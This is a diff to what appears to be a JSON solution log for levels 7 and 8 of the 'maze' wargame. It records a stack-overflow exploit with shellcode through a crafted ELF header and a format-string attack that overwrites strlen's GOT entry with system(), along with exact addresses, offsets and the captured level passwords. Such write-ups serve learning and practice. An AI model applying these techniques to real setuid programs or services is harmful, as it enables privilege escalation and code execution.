@@ -319,6 +319,50 @@
     }
    ],
    "note": "maze7 is an ELF section-header printer whose EVERY parameter comes from the crafted file's own header: Print_Shdrs(fd, e_shoff, e_shstrndx, e_shnum, e_shentsize). The print loop does read(fd, ebp-0x3c, e_shentsize) into a 0x34-byte stack buffer each iteration (on real ELFs e_shentsize=40 = safe; crafted e_shentsize=0x100 overflows, saved EIP at buf+0x40), and the read starts at e_shoff so the shdr-array region IS the payload. The loop runs exactly once (the read rewrites the counter i->1; i++ -> 2 > e_shnum=1 exits), then free(strtab)/free(shdrbuf) run on pointers at buf+0x28/buf+0x30 INSIDE the overflow window - repaired with the gdb-measured real heap addresses (0x804d050/0x804d020, ASLR off). Traps hit: (1) payload appended at 0x34 while e_shoff=0x40 shifted every control dword (free saw 1/0, EIP=0); (2) the heap is rw-p so EIP must point at the STACK (GNU_STACK RWE); (3) printf's %s arg = strtab+sh_name must terminate immediately (leading NUL in the strtab) or vfprintf crashes; (4) the shellcode's push-order must yield '/etc/maze_pass/maze8' forward on the stack; (5) buf swept +-0x1000 step 4 inside the live recorded session: HIT 0xffffd308 (0xffffdb08 in a plain ssh-exec env). 69-byte open/read/write /etc/maze_pass/maze8 shellcode at buf+0x60. Password avdYfGdEvv verified by ssh login as maze8 (uid=15008). Recording: recordings/maze/L7.cast. Files: tools/maze/l7/ (maze7 copy, gen.py, sc.bin, NOTES.md)."
+  },
+  {
+   "lvl": 8,
+   "pw": "bmMHy7DM3E",
+   "user": "maze9",
+   "steps": [
+    {
+     "cmd": "ls -la /maze/maze8; cp /maze/maze8 /run/screen/l8/",
+     "out": [
+      "-r-sr-x--- 1 maze9 maze8 16428 Oct 25 13:39 /maze/maze8"
+     ]
+    },
+    {
+     "cmd": "objdump -d -M intel /maze/maze8 (main + child path)",
+     "out": [
+      "binds 0.0.0.0:PORT (default 1337, argv[1] via atoi); fork per connection;",
+      "child: setreuid(euid,euid) = maze9; send('Give the correct password...');",
+      "recv(0x1ff, buf@ebp-0x230); buf[len]=0; strcmp(buf,'god') (a troll);",
+      "MISMATCH: snprintf(errbuf@ebp-0x444, 0x200, buf) - THE INPUT IS THE FORMAT",
+      "STRING (no 4th arg). Then strlen(errbuf); send(errbuf)."
+     ]
+    },
+    {
+     "cmd": "objdump -R /maze/maze8 | grep strlen; readelf -s /usr/lib32/libc.so.6",
+     "out": [
+      "strlen@GOT = 0x0804b288 (writable, partial RELRO)",
+      "system@libc = 0xf7d6d000 + 0x53ce0 = 0xf7dc0ce0 (ASLR off)"
+     ]
+    },
+    {
+     "cmd": "probe: send AAAA-%1$x-... then a marker scan (ZZZZ at buf+152)",
+     "out": [
+      "vararg mapping measured: arg N = buf + 4N - 536 => N = 134 + o/4"
+     ]
+    },
+    {
+     "cmd": "exp.py: 4x %hhn writes system's bytes into strlen@GOT; the CMD text prints as errbuf's first line so strlen(errbuf)=system(errbuf) cats the password into /tmp/o9",
+     "out": [
+      "GOT write validated with a printf-target test (the reply echoed errbuf)",
+      "/tmp/o9 = bmMHy7DM3E"
+     ]
+    }
+   ],
+   "note": "maze8 is a network daemon: binds a port, forks per connection, setreuid(euid,euid) to maze9 in the child, sends a password prompt, recv's 512 bytes, trolls on 'god', and on mismatch does snprintf(errbuf, 0x200, INPUT) - THE INPUT IS THE FORMAT STRING (no varargs passed). strlen@GOT (0x0804b288, writable - partial RELRO) is called right after: overwrite it with system@libc (0xf7dc0ce0, ASLR off) so strlen(errbuf) = system(errbuf) runs the formatted output as euid maze9. The output's first line = a newline + the cat command (the %c padding becomes a harmless second line). GOT-write details measured live: the vararg indices for buf offsets were found with a marker scan (ZZZZ at buf+152 answered arg 172): arg N = buf + 4N - 536, i.e. N = 134 + o/4 (an earlier off-by-one made the writes hit our own pointer slots and crash); the 4 %hhn deltas are sorted mod-256 from the running char total which INCLUDES the literal command text (len(CMD)); snprintf's %n counts work even past the 512-byte truncation. The GOT write was first validated by targeting printf (the reply echoed errbuf). GOTCHA: ssh from the lab box to itself is BLOCKED (Connecting from localhost is blocked) - verify maze9 from the client. Password bmMHy7DM3E verified by ssh login as maze9 (uid=15009). Recording: recordings/maze/L8.cast. Files: tools/maze/l8/ (cast script, m8exp.py)."
   }
  ],
  "goals": {
